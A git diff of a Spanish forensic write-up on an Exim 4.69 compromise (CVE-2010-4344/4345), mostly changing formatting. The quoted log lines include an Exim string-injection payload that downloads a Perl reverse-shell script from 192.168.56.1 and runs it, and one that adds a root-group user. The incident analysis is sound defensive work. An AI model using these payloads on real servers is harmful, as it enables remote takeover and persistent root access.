@@ -61,7 +61,7 @@ cat root/.bash_history
 ```
 ![bash_history](https://user-images.githubusercontent.com/47476901/151601626-071bcd58-4727-430e-b672-ae151a8816f6.png)
 
-### <b>¿Que hizo el atacante como administrador?</b>
+### ¿Que hizo el atacante como administrador?
 <br>
 **1- Elimina el programa exim del sistema**
 
@@ -76,7 +76,7 @@ apt-get remove exim
 dpkg -l | grep exim
 ```
 
-**2- Comprueba en que ruta se encuentra, crea una carpeta llamada exim4 y la abre. **
+**2- Comprueba en que ruta se encuentra, crea una carpeta llamada exim4 y la abre.**
 
 ```bash
 pwd
@@ -198,13 +198,13 @@ Por eso este fallo del sistema fue tan grave, juntando asi un RCE y un LPE causa
 <b> - RCE: CVE-2010-4344</b><br>
 <b> - LPE: CVE-2010-4345</b> 
 
-<b>Exploits y mas info: <a href="https://eromang.zataz.com/2010/12/20/exim-4-69-remote-code-execution/" target="_blank">EXIM 4.69 RCE</a></b>
+Exploits y mas info: <a href="https://eromang.zataz.com/2010/12/20/exim-4-69-remote-code-execution/" target="_blank">EXIM 4.69 RCE</a>
 
-<b>Dejo un video de como se explota este fallo de seguridad, usando un modulo de metasploit:
+Dejo un video de como se explota este fallo de seguridad, usando un modulo de metasploit:
 <a href="https://www.youtube.com/watch?v=DnSgOGIxjaQ" target="_blank">https://www.youtube.com/watch?v=DnSgOGIxjaQ</a></b>
 <br>
 <a name="logscorruptos"></a>
-<h2>5- Logs corruptos</h2>
+### 5- Logs corruptos
 Una vez conocemos como ha ocurrido todo esto observamos los logs, que fue la principal fuente de explotacion.
 
 ```bash
@@ -238,7 +238,7 @@ ${run{/bin/sh -c "exec /bin/sh -c 'wget http://192.168.56.1/c.pl -O /tmp/c.pl;pe
 
 Exploit de perl que realiza una reverse shell al ordenador (exploit que se ejecuta en exim para conectarse al ordenador remotamente como usuario root):
 
-<b>- Este es el Remote Code Execution</b><br>
+<li>Este es el Remote Code Execution</li>
 <b> La forma en la que se conectó el atacante</b>
 
 ![binarioperl](https://user-images.githubusercontent.com/47476901/151601751-a0c87d38-57af-4380-8b27-d8626a8fbc3c.png)
@@ -249,8 +249,8 @@ cat var/log/exim4/mainlog
       
 Crea un nuevo usuario que este en el grupo de administador con una contraseña hasheada en md5.
 
-<b>- Este es el Local Privilege Escalation</b><br>
-<b>La forma en la que se convierte en root</b>
+<li> Este es el Local Privilege Escalation<br>
+**La forma en la que se convierte en root**
 
 ```bash
 ${run{/bin/sh -c "exec /bin/sh -c 'useradd --gid root --create-home --password  0 0mkpasswd -H md5 Ulyss3s) ulysses'"}} 
